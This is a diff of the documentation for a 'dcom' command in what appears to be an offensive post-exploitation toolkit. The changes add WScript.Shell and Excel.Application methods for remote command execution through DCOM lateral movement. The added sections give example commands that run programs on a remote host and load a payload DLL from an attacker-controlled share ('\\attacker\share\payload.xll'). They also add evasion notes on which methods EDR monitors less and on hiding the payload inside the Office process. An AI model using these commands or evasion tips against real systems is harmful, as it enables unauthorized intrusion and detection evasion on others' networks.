@@ -7,7 +7,7 @@ hidden = false
 
 ## Summary
 
-Execute commands on remote hosts via DCOM (Distributed Component Object Model) lateral movement. Creates COM objects on remote machines using `CoCreateInstanceEx` and invokes shell execution methods. Three DCOM objects supported: MMC20.Application, ShellWindows, and ShellBrowserWindow. No subprocess spawning.
+Execute commands on remote hosts via DCOM (Distributed Component Object Model) lateral movement. Creates COM objects on remote machines using `CoCreateInstanceEx` and invokes shell execution methods. Five DCOM objects supported: MMC20.Application, ShellWindows, ShellBrowserWindow, WScript.Shell, and Excel.Application. No subprocess spawning.
 
 {{% notice info %}}Windows Only{{% /notice %}}
 
@@ -17,7 +17,7 @@ Execute commands on remote hosts via DCOM (Distributed Component Object Model) l
 |----------|----------|---------|-------------|
 | action | Yes | exec | Action: `exec` |
 | host | Yes | - | Target hostname or IP address |
-| object | No | mmc20 | DCOM object: `mmc20`, `shellwindows`, `shellbrowser` |
+| object | No | mmc20 | DCOM object: `mmc20`, `shellwindows`, `shellbrowser`, `wscript`, `excel` |
 | command | Yes | - | Command or program to execute |
 | args | No | - | Arguments to pass to the command |
 | dir | No | C:\Windows\System32 | Working directory on the target |
@@ -58,6 +58,24 @@ dcom -action exec -host 192.168.1.50 -object shellbrowser -command "powershell.e
 ```
 Less reliable on modern Windows. Uses `Document.Application.ShellExecute`.
 
+### Execute via WScript.Shell
+```
+dcom -action exec -host 192.168.1.50 -object wscript -command "cmd.exe /c whoami > C:\temp\out.txt"
+```
+Good fallback when MMC/Shell objects are blocked. Uses `WScript.Shell.Run`. Less commonly monitored by EDR.
+
+### Execute via Excel.Application (DDEInitiate)
+```
+dcom -action exec -host 192.168.1.50 -object excel -command "whoami" -args "> C:\temp\out.txt"
+```
+Executes commands via DDE channel through Excel. Requires Excel installed on target.
+
+### Load DLL via Excel.Application (RegisterXLL)
+```
+dcom -action exec -host 192.168.1.50 -object excel -command "\\\\attacker\\share\\payload.xll"
+```
+Loads a DLL/XLL into the Excel.exe process on the target. Stealthier — payload lives inside the Office process. Command must end in `.xll` or `.dll` to trigger RegisterXLL mode.
+
 ## Example Output
 
 ### Successful Execution
@@ -86,9 +104,11 @@ Failed to create MMC20.Application on 192.168.1.50: CoCreateInstanceEx failed: H
 - **DCOM must be enabled**: The target must have DCOM enabled (default on Windows). Firewall must allow RPC traffic (TCP 135 + dynamic ports).
 - **Admin required**: DCOM execution requires local administrator privileges on the target host.
 - **Object selection**:
-  - `mmc20`: Most reliable, works on all modern Windows versions
+  - `mmc20`: Most reliable, works on all modern Windows versions. Most detected by EDR.
   - `shellwindows`: Requires an interactive explorer.exe session
   - `shellbrowser`: May not work on Windows 10+ (CLSID restricted in newer versions)
+  - `wscript`: WScript.Shell.Run — less commonly monitored, good fallback when MMC is blocked
+  - `excel`: Requires Excel installed. Two modes: commands → DDEInitiate, .dll/.xll files → RegisterXLL (payload lives in Excel process)
 - **Opsec**: DCOM execution creates processes on the target under the authenticated user's context. Event ID 4624 (logon type 3) will be generated. Process creation events (4688) will show the executed command.
 
 ## Common HRESULT Errors
